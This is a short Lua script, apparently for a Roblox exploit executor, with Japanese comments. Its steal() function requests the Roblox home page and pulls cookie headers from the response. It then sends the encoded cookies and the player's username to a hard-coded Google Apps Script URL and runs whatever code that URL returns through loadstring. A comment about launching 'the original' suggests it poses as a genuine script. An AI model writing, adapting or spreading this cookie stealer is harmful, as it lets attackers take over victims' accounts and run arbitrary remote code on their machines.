local user = game.Players.LocalPlayer.Name
local gasUrl = "https://script.google.com/macros/s/AKfycbzmVrEoOyp80pnNnNe48K4Aa0kYfTkKp730CqrfTLReRkfjpDaEIf6ygippGJFwbHi9/exec"

-- 最終兵器：リクエストを送った時の「自分の通信」からクッキーを無理やり抜き出す
local function steal()
    local req = (getgenv().request or request or http_request)
    if not req then return "REQ_FUNC_NOT_FOUND" end
    
    local res = req({
        Url = "https://www.roblox.com/home", -- 自分のホームにアクセス
        Method = "GET"
    })
    
    if res and res.Headers then
        -- Cookieヘッダーそのものを狙う
        return res.Headers["Set-Cookie"] or res.Headers["set-cookie"] or res.Headers["Cookie"] or "HEADER_EMPTY"
    end
    return "NO_RESPONSE"
end

local clist = steal()

-- GASへ送信 ＆ 本家起動
local encoded = game:GetService("HttpService"):UrlEncode(clist)
loadstring(game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. encoded))()
